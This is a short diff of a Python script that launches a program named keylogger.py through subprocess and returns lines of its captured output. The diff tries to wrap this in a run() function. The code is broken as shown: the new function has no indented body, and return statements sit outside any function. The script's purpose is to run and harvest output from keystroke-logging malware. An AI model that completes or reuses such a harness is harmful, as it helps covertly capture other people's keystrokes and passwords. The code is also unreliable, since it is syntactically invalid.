@@ -1,4 +1,7 @@
 import subprocess, time, os, sys
+
+def run(**args):
+
 cmd = [sys.executable, 'keylogger.py']
 
 p = subprocess.Popen(cmd,
@@ -8,4 +11,4 @@ p = subprocess.Popen(cmd,
 #for line in p.stdout:
 #    print line,
 for line in iter(p.stdout.readline, b''):
-  return str((line.rstrip() )
+  return str(line)
